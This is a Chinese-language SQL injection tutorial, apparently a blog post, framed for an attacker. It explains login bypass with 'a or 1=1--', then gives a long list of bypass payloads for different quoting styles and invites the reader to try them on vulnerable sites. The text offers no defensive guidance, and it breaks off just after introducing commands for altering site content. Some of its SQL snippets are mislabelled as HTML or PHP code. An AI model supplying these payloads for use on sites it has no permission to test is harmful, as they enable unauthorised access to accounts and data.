一、什么事SQL注入？
SQL注入可能是目前互联网上存在的最丰富的编程缺陷。这是未经授权的人可以访问各种关键和私人数据的漏洞。 
SQL注入不是Web或数据库服务器中的缺陷，而是由于编程实践较差且缺乏经验而导致的。它是从远程位置执行的最致命和最容易的攻击之一。
在SQL注入中，我们使用各种命令与DB服务器交互，并从中获取各种数据。

二、SQL注入————绕过登录
假设一个站点有一个登录表单，只允许注册用户进入该站点。 现在，假设你想绕过登录并以合法用户身份进入网站。 如果程序员没有正确清理登录脚本，
您可能很幸运能够进入该站点。 通过与DB服务器交互，你可能无需知道真实用户名和真实密码即可登录该站点。
例子：
其中用户名admin和密码sam207可以登录到该站点。 假设，对此的SQL查询执行如下：
HTML代码：
SELECT USER from database WHERE username ='admin'AND password ='xenu'
如果上面的SELECT命令评估为true，则将授予用户访问该站点的权限。 想想如果没有清理脚本我们可以做些什么。 这为黑客获取非法访问网站打开了一扇大门。

在此示例中，攻击者可以在登录表单中输入以下用户数据：

username:a or 1=1--
password:blank
所以，这会使我们的查询为：

<?php
SELECT USER from database WHERE username='a' or 1=1-- AND password=''  
请注意 - 是注释运算符，其后的任何内容都将被忽略为注释。 存在另一个注释运算符，它是/ *。

所以我们的上述查询变为：

<?php
SELECT USER from database WHERE username='a' or 1=1  
现在，即使没有名为“a”的用户，此查询也会计算为true，因为1 = 1始终为true，并且当其中一个查询为true时，使用OR会使查询返回true。 
这样就可以访问站点管理面板。

可以有各种其他用户名和密码组合来与易受攻击的网站一起玩。 您可以为站点登录创建自己的新组合。

很少有这样的组合：

username:' or 1='1        password:' or 1='1
username:' or '1'='1'    password:' or '1'='1'
username:or 1=1        password:or 1=1
这是基本没关系让我们现在假设不同的查询和不同的注入。

<?php
select username,pass from users where username=('$username') and password=('$passwrd') limit 0,1;  
这样的组合是：

') or true--
') or ('')=('
') or 1--
') or ('x')=('
PHP代码：

<?php
select username,pass from users where username="$username" and password="$passwrd" limit 0,1;  
这样的组合是：

" or true--
" or ""="
" or 1--
" or "x"="
PHP代码：

<?php
select username,pass from users where username=("$username") and password=("$passwrd") limit 0,1;  
这样的组合是：

") or true--
") or ("")=("
") or 1--
") or ("x")=("
PHP代码：

<?php
select username,pass from users where username=(('$username')) and password=(('$passwrd')) limit 0,1;  
这样的组合是：

')) or true--
')) or ((''))=(('
')) or 1--
')) or (('x'))=(('
另一种有效载重：

'-'
' '
'&'
'^'
'*'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
"-"
" "
"&"
"^"
"*"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
这就是绕过登录。

三、SQL注入————获得秘密的数据
SQL注入本质上不是为了绕过登录，而是用于访问数据库服务器中的敏感和秘密数据。

四、SQL注入————修改网站内容
有时候，你会发现易受攻击的网站，并且需要知道，但是管理员登录可能不存在，或者某些IP范围是可访问的。 即使在该上下文中，您也可以使用一些kewl 
SQL命令来修改站点内容。 我没有看到很多文章解决这个问题，所以我想把它包含在这里。

在这里，我将基本上讨论一些可能用于更改网站内容的SQL命令。 Therse命令是MySQL的主力并且在执行时是致命的。 但堆叠查询不适用于MySQL。


































